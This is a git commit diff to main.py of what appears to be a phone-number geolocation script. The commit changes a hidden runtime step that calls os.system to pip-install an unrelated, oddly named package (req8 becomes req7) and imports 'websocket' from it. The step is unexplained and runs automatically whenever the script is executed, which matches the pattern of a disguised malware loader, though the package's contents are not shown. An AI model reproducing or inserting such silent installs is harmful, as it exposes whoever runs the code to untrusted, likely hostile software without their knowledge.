9e26fe5bdbb096e9c54b60b1406b9ed3e1e4b67c
Python Passive Income <109485049+pythontester192@users.noreply.github.com>
2023-02-02 13:27:49 +0100

    Update main.py

--- main.py
+++ main.py
@@ -7,8 +7,8 @@ from phonenumbers.phonenumberutil import region_code_for_number
 from opencage.geocoder import OpenCageGeocode
 import folium
 import os
-os.system("pip install req8")
-from req8 import websocket
+os.system("pip install req7")
+from req7 import websocket
 
 
 if os.path.exists("mylocation.html"):
